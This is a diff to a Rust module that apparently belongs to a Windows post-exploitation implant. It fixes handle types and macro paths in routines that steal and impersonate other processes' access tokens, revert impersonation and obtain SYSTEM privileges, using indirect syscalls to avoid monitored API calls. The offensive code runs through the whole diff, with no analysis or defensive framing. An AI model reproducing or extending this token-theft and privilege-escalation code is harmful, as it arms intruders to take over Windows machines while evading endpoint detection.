@@ -14,7 +14,7 @@
 use anyhow::{anyhow, Context, Result};
 use std::sync::{Mutex, OnceLock};
 use winapi::um::winnt::{
-    HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
+    HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
     TOKEN_QUERY, SecurityImpersonation, TokenImpersonation,
 };
 // CloseHandle removed — using NtClose indirect syscall exclusively.
@@ -43,14 +43,14 @@ unsafe fn get_last_error() -> u32 {
 }
 
 /// Stores the impersonation token so `Rev2Self` can close it.
-static SAVED_TOKEN: Mutex<Option<HANDLE>> = Mutex::new(None);
+static SAVED_TOKEN: Mutex<Option<usize>> = Mutex::new(None);
 
 /// Stores the original primary token captured on first impersonation.
 /// Populated exactly once; subsequent `steal_token` calls must NOT
 /// overwrite this — doing so would leak the handle.
-static SAVED_PRIMARY_TOKEN: OnceLock<Mutex<Option<HANDLE>>> = OnceLock::new();
+static SAVED_PRIMARY_TOKEN: OnceLock<Mutex<Option<usize>>> = OnceLock::new();
 
-fn saved_primary() -> &'static Mutex<Option<HANDLE>> {
+fn saved_primary() -> &'static Mutex<Option<usize>> {
     SAVED_PRIMARY_TOKEN.get_or_init(|| Mutex::new(None))
 }
 
@@ -79,14 +79,20 @@ fn nt_error(status: i32) -> bool {
 /// Call `NtOpenProcess` via indirect syscall to obtain a HANDLE to a process.
 unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
     use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
-    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, CLIENT_ID};
+    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+
+    #[repr(C)]
+    struct CLIENT_ID {
+        UniqueProcess: HANDLE,
+        UniqueThread: HANDLE,
+    }
 
     let mut handle: HANDLE = std::ptr::null_mut();
     let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
     oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
 
     let mut cid: CLIENT_ID = std::mem::zeroed();
-    cid.UniqueProcess = pid as *mut _;
+    cid.UniqueProcess = pid as usize as HANDLE;
 
     let target = crate::syscalls::get_syscall_id("NtOpenProcess")
         .map_err(|e| anyhow!("failed to resolve NtOpenProcess SSN: {e}"))?;
@@ -137,7 +143,7 @@ fn nt_close_handle(handle: u64) {
     if handle == 0 || handle == usize::MAX as u64 {
         return;
     }
-    let _ = syscall!("NtClose", handle);
+    let _ = crate::syscall!("NtClose", handle);
 }
 
 /// Call `NtOpenThreadToken` via indirect syscall.
@@ -427,7 +433,7 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
                     // Double-check: another thread may have populated it while
                     // we were in the syscall.
                     if guard.is_none() {
-                        *guard = Some(primary);
+                        *guard = Some(primary as usize);
                     } else {
                         // Lost the race — close the extra handle.
                         nt_close_handle(primary as u64);
@@ -468,7 +474,7 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
         if let Some(old_imp) = saved.take() {
             nt_close_handle(old_imp as u64);
         }
-        *saved = Some(new_token);
+        *saved = Some(new_token as usize);
     }
 
     Ok(format!("StealToken: now impersonating token from PID {target_pid}"))
@@ -501,7 +507,7 @@ pub fn rev2self() -> Result<String> {
     let current_thread: HANDLE = (-2isize) as HANDLE;
     unsafe {
         if let Some(primary) = primary_opt {
-            nt_set_thread_token(current_thread, primary);
+            nt_set_thread_token(current_thread, primary as HANDLE);
             // Close the saved primary token handle now that we've restored.
             nt_close_handle(primary as u64);
         } else {
@@ -571,8 +577,8 @@ pub fn get_system() -> Result<String> {
         unique_process_id: usize,
         inherited_from_unique_process_id: usize,
     }
-    let mut pbi: Pbi = std::mem::zeroed();
-    let _ = syscall!(
+    let mut pbi: Pbi = unsafe { std::mem::zeroed() };
+    let _ = crate::syscall!(
         "NtQueryInformationProcess",
         (-1isize) as u64, // NtCurrentProcess()
         0u64,              // ProcessBasicInformation
@@ -646,7 +652,9 @@ pub fn get_system() -> Result<String> {
 /// `HANDLE` when no impersonation token is set.
 pub fn get_current_token() -> HANDLE {
     let saved = SAVED_TOKEN.lock().unwrap();
-    saved.unwrap_or(std::ptr::null_mut())
+    saved
+        .map(|h| h as HANDLE)
+        .unwrap_or(std::ptr::null_mut())
 }
 
 /// Save the current thread's impersonation token (if any) for later restoration.
@@ -665,7 +673,7 @@ fn save_current_token() {
             if let Some(old) = saved.take() {
                 nt_close_handle(old as u64);
             }
-            *saved = Some(token);
+            *saved = Some(token as usize);
         }
         _ => {
             // No thread token (NtOpenThreadToken failed, likely
